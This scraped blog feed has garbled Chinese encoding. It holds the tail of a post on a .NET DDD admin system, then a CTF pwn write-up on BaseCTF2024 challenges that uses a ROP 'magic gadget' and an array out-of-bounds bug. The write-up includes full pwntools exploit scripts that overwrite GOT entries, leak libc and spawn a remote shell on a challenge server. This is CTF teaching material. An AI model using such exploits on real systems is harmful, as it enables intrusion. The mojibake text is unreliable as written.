<p>ä¸å¡å¼å¸¸ç¨<code>KnownException</code>æ¥å¤çï¼æ¡æ¶ä¼èªå¨è½¬æ¢æåéçHTTPç¶æç ãæ¯å¦å¨èåæ ¹éï¼</p>
<pre><code class="language-csharp">// å¨èåæ ¹ä¸­
public void SoftDelete()
{
    if (IsDeleted)
    {
        throw new KnownException("é¨é¨å·²ç»è¢«å é¤");
    }
    // ...
}

// å¨å½ä»¤å¤çå¨ä¸­
var dept = await deptRepository.GetAsync(request.DeptId, cancellationToken) 
    ?? throw new KnownException($"æªæ¾å°é¨é¨ï¼DeptId = {request.DeptId}");
</code></pre>
<p>è¿æ ·åç«¯æ¶å°çéè¯¯ä¿¡æ¯å°±å¾æ¸æ°ï¼ä¸éè¦ååé¢å¤çè½¬æ¢ã</p>
<h2 id="æµè¯ç­ç¥">æµè¯ç­ç¥</h2>
<p>æµè¯è¿åï¼é¡¹ç®ç¨çæ¯xUnitï¼éææµè¯ç¨äºAspireæ¥èªå¨ç®¡çæµè¯ç¯å¢ãè¿æ ·åçå¥½å¤æ¯ä¸ç¨æå¨æ­å»ºæµè¯æ°æ®åºãRedisè¿äºåºç¡è®¾æ½ï¼Aspireä¼èªå¨å¯å¨åç®¡çã</p>
<p>çä¸ä¸ªé¨é¨åå»ºæ¥å£çæµè¯ä¾å­ï¼</p>
<pre><code class="language-csharp">[Collection(WebAppTestCollection.Name)]
public class DeptTests(WebAppFixture app) : AuthenticatedTestBase&lt;WebAppFixture&gt;(app)
{
    [Fact]
    public async Task CreateDept_WithValidData_ShouldSucceed()
    {
        // Arrange
        var client = await GetAuthenticatedClientAsync();
        var deptName = $"æµè¯é¨é¨_{Guid.NewGuid():N}";
        
        try
        {
            // Act
            var request = new CreateDeptRequest(deptName, "æµè¯å¤æ³¨", null, 1);
            var (response, result) = await client.POSTAsync&lt;
                CreateDeptEndpoint, 
                CreateDeptRequest, 
                ResponseData&lt;CreateDeptResponse&gt;&gt;(request);
            
            // Assert
            Assert.True(response.IsSuccessStatusCode);
            Assert.NotNull(result?.Data);
            Assert.Equal(deptName, result.Data.Name);
        }
        finally
        {
            await CleanupTestDataAsync();
        }
    }
}
</code></pre>
<p>è¿ç§æµè¯æ¹å¼å¾æ¥è¿çå®çåºæ¯ï¼æµè¯çæ¯å®æ´çHTTPè¯·æ±æµç¨ï¼èä¸ä¼èªå¨æ¸çæµè¯æ°æ®ï¼ä¿è¯æµè¯ä¹é´çç¬ç«æ§ãå¦å¤è¿æ¯æèº«ä»½è®¤è¯æµè¯ï¼å¯ä»¥æ¨¡æç»å½ç¨æ·çåç§æä½ã</p>
<h2 id="åç«¯æ¶æ">åç«¯æ¶æ</h2>
<p>åç«¯ç¨çæ¯Vben Adminè¿ä¸ªæ¨¡æ¿ï¼è¿æ¯ä¸ä¸ªåºäºVue 3çç®¡çåå°æ¡æ¶ãææ¯æ ä¹æ¯è¾ä¸»æµï¼Vue 3 Composition APIãTypeScriptãViteãAnt Design Vueï¼ç¶æç®¡çç¨Piniaï¼è·¯ç±ç¨Vue Routerã</p>
<p>Vben Adminè¿ä¸ªæ¡æ¶åå¾å¾å®åï¼å¼ç®±å³ç¨çåè½å¾å¤ãæ¯å¦æéæ§å¶ï¼æ¯æè·¯ç±æéåæé®æéï¼ç¨èµ·æ¥å¾æ¹ä¾¿ãè¿æå½éåæ¯æï¼å¯ä»¥å¤è¯­è¨åæ¢ãä¸»é¢åå¸å±ä¹å¯ä»¥å®å¶ï¼åºæ¬çç®¡çåå°éæ±é½è½æ»¡è¶³ã</p>
<p>æéè¦çæ¯ç±»åå®å¨ï¼ååç«¯é½ç¨äºTypeScriptï¼æ¥å£å®ä¹å¥½ä¹åï¼ç±»åæ£æ¥è½å¸®ä½ åç°å¾å¤é®é¢ã</p>
<h2 id="å¼åè§è">å¼åè§è</h2>
<p>ä¸ºäºè®©ä»£ç è´¨éæ´ç»ä¸ï¼é¡¹ç®éå¶å®äºä¸äºå¼åè§èãæ¯å¦æä»¶çç»ç»æ¹å¼ï¼</p>
<ul>
<li>èåæ ¹æ¾å¨ <code>Domain/AggregatesModel/{AggregateName}Aggregate/</code></li>
<li>é¢åäºä»¶æ¾å¨ <code>Domain/DomainEvents/</code></li>
<li>ä»å¨æ¾å¨ <code>Infrastructure/Repositories/</code></li>
<li>å½ä»¤æ¾å¨ <code>Web/Application/Commands/{Module}Commands/</code></li>
<li>æ¥è¯¢æ¾å¨ <code>Web/Application/Queries/</code></li>
<li>ç«¯ç¹æ¾å¨ <code>Web/Endpoints/{Module}Endpoints/</code></li>
</ul>
<p>è¿æä¸äºå¼ºå¶æ§çè¦æ±ï¼æ¯å¦ææèåæ ¹é½ç¨å¼ºç±»åIDï¼èä¸ä¸æå¨èµå¼IDï¼ä¾èµEFçå¼çæå¨ãææå½ä»¤é½è¦æå¯¹åºçéªè¯å¨ãé¢åäºä»¶è¦å¨èååçæ¹åæ¶åå¸ãå½ä»¤å¤çå¨ä¸è½è°ç¨SaveChangesï¼æ¡æ¶ä¼èªå¨å¤çãä»å¨å¿é¡»ç¨å¼æ­¥æ¹æ³ãä¸å¡å¼å¸¸ç¨KnownExceptionå¤çã</p>
<p>å¦å¤ï¼é¡¹ç®è¿æä¾äºå¾å¤ä»£ç çæ®µï¼å¯ä»¥å¿«éçæå¸¸ç¨ä»£ç ãæ¯å¦<code>ncpcmd</code>å¯ä»¥çæå½ä»¤åå¶éªè¯å¨åå¤çå¨ï¼<code>ncpar</code>å¯ä»¥çæèåæ ¹ï¼<code>ncprepo</code>å¯ä»¥çæä»å¨æ¥å£åå®ç°ï¼<code>epp</code>å¯ä»¥çæFastEndpointçå®æ´å®ç°ãè¿æ ·å¼åæçä¼é«ä¸å°ã</p>
<h2 id="äºåçæ¯æ">äºåçæ¯æ</h2>
<p>é¡¹ç®éæäº.NET Aspireï¼è¿ä¸ªåè½ççå¾æ¹ä¾¿ãå¯å¨å¼åç¯å¢åªéè¦è¿è¡AppHosté¡¹ç®ï¼Aspireä¼èªå¨ç®¡çææä¾èµæå¡ï¼ä¸éè¦æå¨å¯å¨æ°æ®åºãRedisãRabbitMQè¿äºã</p>
<pre><code class="language-bash"># ä»éç¡®ä¿Dockerç¯å¢è¿è¡
docker version

# ç´æ¥è¿è¡AppHosté¡¹ç®ï¼Aspireä¼èªå¨ç®¡çææä¾èµæå¡
cd src/Ncp.Admin.AppHost
dotnet run
</code></pre>
<p>Aspireä¼èªå¨å¯å¨åç®¡çæ°æ®åºå®¹å¨ï¼MySQLãPostgreSQLç­ï¼ãæ¶æ¯éåå®¹å¨ï¼RabbitMQç­ï¼ãRediså®¹å¨ï¼è¿ä¼æä¾ç»ä¸çAspire Dashboardçé¢ï¼å¯ä»¥æ¥çæææå¡çç¶æãæå¡ä¹é´çè¿æ¥å­ç¬¦ä¸²ä¹ä¼èªå¨éç½®ï¼çäºå¾å¤éº»ç¦ã</p>
<h2 id="ä»£ç åæå¯è§å">ä»£ç åæå¯è§å</h2>
<p>æ¡æ¶è¿æä¾äºä»£ç æµåæåå¯è§ååè½ï¼è¿ä¸ªå¯¹çè§£æ¶æå¾æå¸®å©ãå¯ä»¥éè¿å½ä»¤è¡å·¥å·çæHTMLæä»¶ï¼</p>
<pre><code class="language-bash"># å®è£å¨å±å·¥å·
dotnet tool install -g NetCorePal.Extensions.CodeAnalysis.Tools

# çæå¯è§åæä»¶
cd src/Ncp.Admin.Web
netcorepal-codeanalysis generate --output architecture.html
</code></pre>
<p>æ¯æçææ¶ææµç¨å¾ãå½ä»¤é¾è·¯å¾ãäºä»¶æµç¨å¾ãç±»å¾ç­ï¼å¯ä»¥ç´è§å°çå°ä»£ç ä¹é´çå³ç³»åæ°æ®æµåã</p>
<h2 id="æ»ç»">æ»ç»</h2>
<p>è¿ä¸ªé¡¹ç®ç®æ¯ä¸ä¸ªDDDæ¶æçå®è·µæ¡ä¾ï¼å±ç¤ºäºå¦ä½å¨.NET 10çæä¸­åºç¨DDDãCQRSãäºä»¶é©±å¨è¿äºæ¶æææ³ãæ´ä½æ¶ææ¸æ°ï¼èè´£åæï¼ä»£ç ç»ç»å¾ä¹æ¯è¾è§èã</p>
<p>ææ¯æ ä¸ï¼åç«¯ç¨.NET 10 + EF Core + FastEndpoints + MediatRï¼åç«¯ç¨Vue 3 + TypeScript + Viteï¼é½æ¯ç®åæ¯è¾ä¸»æµçææ¯ãå¼åä½éªä¸ï¼æä»£ç çæ®µãèªå¨åå·¥å·ï¼è¿æå®åçå¼åè§èï¼å¼åæçè¿å¯ä»¥ã</p>
<p>å¯ç»´æ¤æ§è¿åï¼ä»£ç åå±æ¸æ°ï¼æµè¯æ¯æä¹æ¯è¾å®åï¼è¿æä»£ç å¯è§åå·¥å·ï¼æ¹ä¾¿æ°äººçè§£æ¶æãäºåçæ¯æä¹å¾å°ä½ï¼Aspireè®©åºç¡è®¾æ½ç®¡çåå¾ç®åã</p>
<p>å¦æä½ ä¹å¨åç±»ä¼¼çç®¡çç³»ç»ï¼æèæ³äºè§£DDDå¨å®éé¡¹ç®ä¸­çåºç¨ï¼å¯ä»¥ççè¿ä¸ªé¡¹ç®çä»£ç ï¼åºè¯¥è½æä¸äºåèä»·å¼ãé¡¹ç®å°åå¨<a href="https://github.com/zhouda1fu/Ncp.Admin" target="_blank" rel="noopener nofollow">https://github.com/zhouda1fu/Ncp.Admin</a>ï¼æ¬¢è¿äº¤æµè®¨è®ºã</p>
<h2 id="åèèµæ">åèèµæ</h2>
<p>æåéä¸ä¸äºç¸å³çåèèµæï¼æå´è¶£çæåå¯ä»¥æ·±å¥äºè§£ä¸ä¸ï¼</p>
<ul>
<li><a href="https://github.com/netcorepal/netcorepal-cloud-framework" target="_blank" rel="noopener nofollow">NetCorePal Cloud Framework</a> - é¡¹ç®ä½¿ç¨çåºç¡æ¡æ¶</li>
<li><a href="https://fastendpoints.com/" target="_blank" rel="noopener nofollow">FastEndpoints</a> - è½»éçº§APIæ¡æ¶</li>
<li><a href="https://github.com/vbenjs/vue-vben-admin" target="_blank" rel="noopener nofollow">Vben Admin</a> - åç«¯ç®¡çåå°æ¨¡æ¿</li>
<li><a href="https://learn.microsoft.com/dotnet/aspire/" target="_blank" rel="noopener nofollow">.NET Aspire</a> - äºåçåºç¨å¼åå¹³å°</li>
</ul>
<p>é¡¹ç®æºç å°åï¼<a href="https://github.com/zhouda1fu/Ncp.Admin" target="_blank" rel="noopener nofollow">https://github.com/zhouda1fu/Ncp.Admin</a></p>
<hr>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-18 22:57">2026-01-18 22:57</span>&nbsp;
<a href="https://www.cnblogs.com/aishangyipiyema">çº¢æ³¥å·´ç®éª</a>&nbsp;
éè¯»(<span id="post_view_count">72</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19499381);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19499381', targetLink: 'https://www.cnblogs.com/aishangyipiyema/p/19499381', title: 'åºäºNetCorePal Cloud FrameworkçDDDæ¶æç®¡çç³»ç»å®è·µ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æ çä¸ä¸ªmagic gadgetçè¿ç¨ä»¥åæ°ç»è¶ç ]]></title>
    <link>https://www.cnblogs.com/firefly-star/p/19499036</link>
    <guid>ae2e8437f90b5f691cf1a7a3518cb096</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/firefly-star/p/19499036" title="åå¸äº 2026-01-18 20:04">
    <span role="heading" aria-level="2">æ çä¸ä¸ªmagic gadgetçè¿ç¨ä»¥åæ°ç»è¶ç</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        the endï¼ï¼ï¼
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<pre><code class="language-asm">.text:0000000000400658                 add     [rbp-3Dh], ebx
.text:000000000040065B                 nop
.text:000000000040065C                 retn
</code></pre>
<p>è¿ä¸ªgadgetå°±æ¯è¾å¸¸è§äºï¼å°±æ¯æebxçå¼å ç»rbp-0x3dåçä¸ä¸ªæéè§£å¼ç¨åçåå®¹ï¼åé¢æ¯è¿è¡äºä¸ä¸ªnopä¸ä½æä½ï¼ååé¢retå°±æ¯ç»§ç»­æ§è¡æä»¬æ ä¸çåå®¹ï¼è¿ä¸ªä¸»è¦æ¯è¦æ§å¶rbpä¸rbxæè½å®ç°ä»»æå°ååï¼ä¸»è¦è¿æ¯å©ç¨ä¹åè®²è¿çcsuå½æ°å»æ§å¶è¿ä¸¤ä¸ªå¯å­å¨ãä¸é¢çä¾é¢</p>
<h4 id="basectf2024æ°çèµezstack">BaseCTF2024æ°çèµezstack</h4>
<p>åchecksec<br>
<img alt="Q3`IZ7H~STBYZ7()8IEVW0J" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118194813256-1216057245.png" class="lazyload"></p>
<p>è¿éåªå¼äºnxä¿æ¤ï¼æä»¬å»idaçç<br>
<img alt="Y8`A78$U0FF1LZCL(DAXO4N" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118194841085-596785042.png" class="lazyload"></p>
<p>è¿éå°±ä¸ä¸ªåç§ç§çgetsæ æº¢åºï¼ä»ä¹è¾åºå½æ°é½æ²¡æãé£æä¹åå¢ï¼è¿éå ä¸ºæ²¡æå¨å¼relroå¯ä»¥æret2dlresolveï¼ä¸è¿è¿éä¹æmagic gadget<br>
<img alt="@VCEQG%I4)ZKHTJH" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118194909214-203775508.png" class="lazyload"></p>
<p>é£è¿éå¶å®æå¾å¤è§£æ³äºï¼ç¬¬ä¸ç§å°±æ¯ret2dlresolveï¼åé¢æä¼åç¬åä¸ªæç« åå»¶è¿ç»å®æºå¶ä¸èµ·è®²ï¼ï¼ç¬¬äºç§æ¯ç¨magic gadgetågotè¡¨ï¼ååºæ¥ä¸ä¸ªsystemå½æ°ï¼ç´æ¥ropé¾æå®ï¼ç¬¬ä¸ç§æ¯å ä¸ºæ åè¾åºä¹æ¯ä¸ä¸ªlibcåºçæéï¼æä»¥æä»¬ä¹å¯ä»¥åè¿ä¸ªï¼åªè¦æä»¬æä»åæä¸ä¸ªè¾åºå½æ°ï¼å°±å¯ä»¥å®ç°æ³é²libcåºå<br>
<img alt="}~Z${Z`MRYU)UE()AU963KW" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195021632-1087741074.png" class="lazyload"></p>
<p>è¿éå¶å®ç¬¬ä¸ç§åç¬¬äºç§é½æ¯è¾çé¢ï¼å¦æå¼äºfull relroé£å°±ä¸è½ç¨äºï¼ç¬¬ä¸ç§å°±æ¯è¾å¨ä¸ç¹ï¼æ²¡æè¿ä¸ªéå¶ã</p>
<h5 id="ç¨magic-gadgetæ¹gotè¡¨è§£æ³">ç¨magic gadgetæ¹gotè¡¨è§£æ³</h5>
<p>è¿éæä»¬åçç¬¬äºç§ï¼æä»¬åæ¾gotè¡¨æåªäºå½æ°<br>
<img alt="JN17UWAK26TT_0B" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195053110-497363831.png" class="lazyload"></p>
<p>è¿éæä¸¤ä¸ªå½æ°ï¼éä¾¿ååªä¸ªé½ä¸æ ·ï¼æä»¬ågetsççï¼åæ¾åºgetsåsystemå¨libcçåç§»<br>
<img alt="DI6441H9(178_7((DD2I4R" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195124184-414845803.jpg" class="lazyload"></p>
<p>æä»¬åªéè¦æ0x80520+æä¸ªæ°è®©å®=0x50d70ï¼æä»¬è¿éå¾æ¾ç¶æ³¨æå°è¿éè¦ç¨è¡¥ç ï¼æä»¬ç´æ¥ç®ä¸ä¸å°±ç¥éç­æ¡æ¯0xFFFFFFFFFFFD0850æä»¥è¿éå°±å¾ç®åäºï¼æä»¬åªéè¦æ§å¶rbxæ¯0xFFFFFFFFFFFD0850ï¼rbpæ¯getsçgotè¡¨çå°å+0x3då°±åå®äºï¼å®æ´expå¦ä¸</p>
<pre><code>from pwn import *
import sys
#context.log_level='debug'
context.arch='amd64'
flag = 1
elf=ELF('./pwn')
libc = ELF('./libc.so.6')
if flag:
    p = remote('challenge.imxbt.cn',32689)
else:
    p = process('./pwn')
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def csu(rbx,rbp,got,rdi,rsi,rdx):
	pay=p64(0)+p64(rbx)+p64(rbp)+p64(got)+p64(rdi)+p64(rsi)+p64(rdx)
	return pay
def dbg():
    gdb.attach(p)
    pause()
magic=0x400658
csugo=0x4006D0
csuin=0x4006E6
rdi=0x4006f3
gets=elf.got['gets']
target=0x601018
ret=0x4006F4
system=elf.plt['gets']
get=elf.sym['gets']
pay=0x10*b'b'+flat(rdi,elf.bss()+0x50,get)+p64(csuin)+csu(0xFFFFFFFFFFFD0850,target+0x3d,0,0,0,0)+p64(magic)+flat(ret,rdi,elf.bss()+0x50,system)
sl(pay)
sl(b'/bin/sh\x00')
ti()
</code></pre>
<p>ææå¦ä¸<br>
<img alt=")QTV6KVN}9H0SDY_AM9I" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195148921-952805458.png" class="lazyload"></p>
<h5 id="ç¨magic-gadgetæ¹bssè§£æ³">ç¨magic gadgetæ¹bssè§£æ³</h5>
<p>å»æ¹bssä¹å¯ä»¥ï¼ä¸è¿æç¹å¥æªï¼æè¿ç¨æ²¡æéãå·ä½æµç¨æ¯ä¸æ ·çï¼åä»stdinï¼stdoutï¼stderréæä¸ä¸ªæ¾ä»ä»¬å¨libcéçåç§»ï¼åæ¾ä¸ä¸ªè¾åºå½æ°å¨libcéçåç§»ãä¸è¿å ä¸ºè¦æ³é²libcæä»¥éè¦ä¸¤æ¬¡è¾å¥ï¼ç´æ¥è¿åmainæ¯ä¼æ¥éçï¼å¥½åæ¯å ä¸ºioç»æä½è¢«æä»¬æ¹æäºæä»¥ä¸è½ç´æ¥ç¨getsäºï¼è¿ééæ©å°±æ¯åç¨ä¸æ¬¡magic gadgetææä»¬æ¹çioç»æåæ¹åå»å°±å¯ä»¥åç¨getsäºå¾bssåäºï¼åå®æä»¬åç¨ä¸¤æ¬¡leaveæ è¿ç§»è¿å»æ§è¡å³å¯ï¼ä¹å¯ä»¥ä¸è¿ç§»ç¨ret2csuï¼ï¼ç¶åå ä¸ºsystemå½æ°ä¼æ¬æ ï¼è¦ægetsåå¥bssçå°ååé«ä¸ç¹ï¼æææ¬å°çèæ¬å¦ä¸</p>
<pre><code>from pwn import *
import sys
#context.log_level='debug'
context.arch='amd64'
flag = 1
elf=ELF('./pwn')
libc = ELF('./libc.so.6')
if flag:
    p = remote('challenge.imxbt.cn',30415)
else:
    p = process('./pwn')
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def csu(rbx,rbp,got,rdi,rsi,rdx):
	pay=p64(0)+p64(rbx)+p64(rbp)+p64(got)+p64(rdi)+p64(rsi)+p64(rdx)
	return pay
def dbg():
    gdb.attach(p)
    pause()
magic=0x400658
csugo=0x4006D0
csuin=0x4006E6
rdi=0x4006f3
gets=elf.got['gets']
get=elf.sym['gets']
target=0x601040
ret=0x4006F4
leave=0x40068C
bss=0x6011D0+0x800
rbp=0x400656
pay=0x10*b'b'+p64(csuin)+csu(0xFFFFFFFFFFEF9160,target+0x3d,0,0,0,0)+p64(magic)+p64(csuin)+csu(0,1,target,2,gets,0x20)+p64(csugo)+csu(0x106EA0,target+0x3d,0,0,0,0)+p64(magic)+flat(rdi,bss,get,rbp,bss,leave)+p64(leave)
sl(pay)
libcbase=u64(rc(6).ljust(8,b'\x00'))-libc.sym['gets']
print(hex(libcbase))
system=libcbase+libc.sym['system']
binsh=libcbase+next(libc.search(b'/bin/sh'))
pay=flat(0,ret,rdi,binsh,system)
sl(pay)
ti()
</code></pre>
<p>æççæ¬æ¯glibc2.35ï¼å°çæ¬æ¯3.11ï¼è¿ç¨æ¯glibc2.35å°çæ¬æ¯3.8ãçè®ºä¸è¿ç¨çåç§»åºè¯¥æ¯0xFFFFFFFFFFEF9008ï¼ä¸è¿æè¾è¿ä¸ªä¸ç¥éä¸ºå¥ä¸è¡ï¼å¥½åæ¯æ²¡æ¹æwriteå½æ°ï¼æ²¡ææ³é²åºæ¥ãæºå¥æªçãä¸è¿æè·¯å¤§æ¦å°±æ¯è¿æ ·ï¼ææå¦ä¸<br>
<img alt="5IQ7YA{1KO8@%}O53GIFQXL" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195216136-1018523056.png" class="lazyload"></p>
<h2 id="æ°ç»è¶ç">æ°ç»è¶ç</h2>
<p>æ°ç»è¶çé¡¾åæä¹ï¼ä¹å°±æ¯è®¿é®æ°ç»æ¶ç´¢å¼è¶åºå®ä¹èå´ï¼å¯è½å¯¼è´ç¨åºè®¿é®éæ³åå­ãæ¯å¦æå®ä¹ä¸ä¸ªæ°ç»a[10]ï¼ç¶ååé¢æa[i]ä½iå´è½ç­äº10ï¼è¿å°±è¶çäºãå¦æä»æ£æ¥ièå´æ£æ¥çä¸ç»è´ï¼æ²¡æ£æ¥ä¸çæä¸çï¼å°±å¯ä»¥å®ç°å ä¹ä»»æå°åè®¿é®ï¼é£å·ä½è®¿é®çå°åæ¯ä»ä¹å°åçå¢ï¼è¿å°±å¾æä¸äºcè¯­è¨åºç¡äºï¼å¨cè¯­è¨ä¸­æä»¬ç¥éa[1]=*(a+1)è¿æ ·æä»¬ça[i]å¶å®å°±æ¯ *(a+i)åå¦iå¯ä»¥æ§å¶ï¼æèa+iè¿ä¸ªå°åå°±æ¯æä»¬æ³æ¹çå°åï¼é£ä¹æä»¬å°±å¯ä»¥è®¿é®å°è¿ä¸ªå°åçåå­ï¼å°±å¾æå¯è½å¯ä»¥è¿è¡ä¿®æ¹ãå·ä½çå°åè¿ç®å°±è¦çè¯¥æ°ç»çå®ä¹ï¼intå°±æ¯4å­èå®ä¹ï¼åå¦int a[10]é£aå°åä¸a+1å°åå°±å·®4ï¼charå°±å·®1ï¼doubleå°±å·®8ï¼äºç»´æ°ç»ä¹ä¸æ ·ï¼äºç»´æ°ç»å¯ä»¥çæä¸ç»´æ°ç»çæ°ç»ï¼æ¯å¦int a[10] [10]ï¼ç¸å½äºæa[10]åçæä¸ä¸ªæ°ç»çåç´ ï¼é£a[1]è·ç¦»aå°±å·®10ä¸ªintï¼ä¹å°±æ¯40ãè¿ä¸æçè¯å¯ä»¥å»ççcè¯­è¨ï¼ä¸é¢æä»¬çé¢ã</p>
<h4 id="basectf2024æ°çèµäºå­æ£">BaseCTF2024æ°çèµäºå­æ£</h4>
<p>è¿é¢å¶å®9åéå1åpwnï¼éååºæ¥äºåºæ¬å°±åå®äºï¼ä¸è¿æä»¬è¿æ¯èè§ç©åchecksec<br>
<img alt="AHGT0C`N8%FTZZHROPA}GA" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195245005-953308811.png" class="lazyload"></p>
<p>ç¶åå»idaçç<br>
<img alt="1BR8%BU`Y3$LHVL45_LDO" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195311744-1850352138.png" class="lazyload"></p>
<p>è¿éæ¢ç¶æ¯äºå­æ£ï¼é£è¯å®è¦æè¿å ä¸ªæ¨¡åï¼æå°å°å¾ï¼ç©å®¶ä¸æ£ï¼å¦ä¸æ¹ä¸æ£ï¼æ£æ¥ï¼è·èãç®åéåä¸ä¸ï¼è¿éé»è¾å°±æ¯é¦åå±ç¤ºå°å¾ï¼ç¶åç¨æ·åä¸ï¼å¤æ­ç¨æ·æ¯å¦èµ¢ï¼æ²¡èµ¢å°±éå½è°ç¨gameå½æ°æa1æ¹æ1è®©ifä¸ºçï¼è¿èè®©çµèä¸æ£ï¼ç¶åå¤æ­çµèææ²¡æèµ¢ï¼ç¶åæa1æ¹æ0è®©ç¨æ·åä¸ï¼åªè¦æä»¬çä¸ä¸¤é¢æ£å°±è·èå°±ç»æä»¬shellï¼æ¾ç¶è¿æ ·ç´æ¥ä¸ä¸å¯è½è·å¾shellï¼æä»¥ä¸å®ææä¸ªæ¼æ´ã</p>
<p><img alt="13OB90LPMQE$QMFA58{{B$1" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195332257-322282471.png" class="lazyload"></p>
<p>è¿éæ¼æ´å¨ç¨æ·ä¸æ£é£é<br>
<img alt="QFWDFOKY%HT2OQ06@8CKD" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195352624-1330046076.png" class="lazyload"></p>
<p>è¿éææ°ç»è¶çï¼ä¸è¿è¿ç¨çæ¶åè¦æ³¨æå ä¸ºå°å¾å¶å®éé¢ä¸å¼å§é½æ¯æ°å­-1ï¼æä»¥æä»¬åªè½å¨æ°å­ä¸º-1çå°æ¹æ¹æ°å¼ï¼æ¹æè¿ä¸ª0ï¼æ¥ä¸æ¥æä»¬çå¤æ­è¾èµ¢çå½æ°ã</p>
<p>è¿éæä»¬å¯ä»¥çè§ï¼è¿éåä¸ªå¾ªç¯ï¼èè¿ä¸ªxæ°ç»åyæ°ç»éåèµ·æ¥åºè¯¥å°±æ¯ä¸ä¸ªæ¹åæ°ç»ï¼éè¿n7çå¾ªç¯è®©è¿ä¸¤ä¸ªæ°ç»ç»åå®ç°æ å®æ¹åï¼n5çå¾ªç¯å¨éå8ä¸ªæ¹åçæ£å­ï¼n19_3ä¸n19_2çç»åå°±æ¯éåæ´ä¸ªå°å¾æ¾æ ç¹ï¼åé¢n7ä¸n5å°±æ¯å¨è¿ä¸ªæ ç¹ä¸å»¶ä¼¸8ä¸ªæ¹åï¼å¦ææä¸æ¬¡æ²¡æ¾å°å¯¹åºæ£å­å°±æ­å¼è¿ä¸æ¬¡n5çå¾ªç¯æ¢ä¸ä¸ªæ¹ååæ¾ï¼ä¹å°±æ¯äºå­æ£æ²¡è¿èµ·æ¥äºä¸ªå­ï¼ï¼å¦æè½æ¾å°äºä¸ªï¼éåäºæ¬¡ï¼å°±å¤æ­è·èãæä»¬å¯ä»¥ççè¿ä¸ªæ¹ååéçæ°ç»<br>
<img alt="OMY$C@ROM(2T1I2HJN~SDS" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195420941-1979608242.png" class="lazyload"></p>
<p>è¿ä¸ªddå°±æ¯å®ä¹åå­çæædefine doublewordï¼åå­å°±æ¯4ä¸ªå­èï¼ä¹å°±æ¯intçææãå¶ä¸­2  dup(0)å°±æ¯0éå¤ä¸¤æ¬¡ï¼0FFFFFFFFhè¿éhå°±æ¯16è¿å¶çææï¼å¶å®å°±æ¯0xFFFFFFFFï¼è¿ä¸ªå°±æ¯-1çè¡¥ç å½¢å¼ï¼æ°ç»åå®¹å¦ä¸</p>
<pre><code>y ï¼0 0 1 -1 1 -1 1 -1
x : 1 -1 0 0 1 -1 -1 1
</code></pre>
<p>å ä¸ºå°ç«¯åºæä»¥ä»ä»¬çå°åå°±æ¯ä»å·¦å°å³å°±æ¯ä¾æ¬¡ç±0x4020å»+4ãå°è¿éè¿ä¸ªé¢å°±å·®ä¸å¤ç»æäºï¼å ä¸ºæä»¬ç¨æ·è¾å¥è½æ-1åæ0ï¼è¿éæä»¬è¦ä¹é0x402cè¿ä¸ªå°åæè¿ä¸ª-1åæ0ï¼è¿æ ·xyç»åçæ¹ååéå°±åæ(0,0)äºï¼ç¸å½äºè¿ä¸ªå°æ¹å»¶ä¼¸çäºä¸ªæ¹åé½æ¯ä»èªå·±ï¼å®ç°æ£æ¥èªå·±äºæ¬¡ï¼é£å°±å¯ä»¥å®ç°ä¸¤é¢æ£å­è·èäºï¼ä¹å°±æ¯ç¬¬äºé¢æ£å­ä¸å¨æ¹åæ°ç»éäºååï¼ï¼è¦ä¹æä»¬éæ0x4044è¿ä¸ªå°åç-1åæ0ï¼è¿äºé½å¯ä»¥ãæ¥ä¸æ¥æä»¬ç®æä»¬å°å¾æ°ç»å°æ¹åæ°ç»çåç§»<br>
<img alt="KF%FKN`58RO2DF_UMIL5JO1" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202601/3728044-20260118195450453-1605003697.png" class="lazyload"></p>
<p>å°å¾æ°ç»çèµ·å§ä½ç½®æ¯0x9D60èä¸ä»ä¹æ¯intï¼ä»¥0x4044ä¸ºä¾ï¼å°è¿çåç§»å°±æ¯0x9D60-0x4044ä¹å°±æ¯0x5D1Cä¹å°±æ¯åè¿å¶ç23836æä»¬ç¥éintä»£è¡¨4å­èï¼23836ä¹å°±æ¯5,959ä¸ªåç§»ï¼ä¹å°±æ¯æä»¬éè¦map[-5959]å°±è½æ¹å°è¿ä¸ªä½ç½®å®ç°ææ¹ååéæ¹æ(0,0)ï¼æä»¬ä¸æ£æ¯è¿æ ·ä¸ç<br>
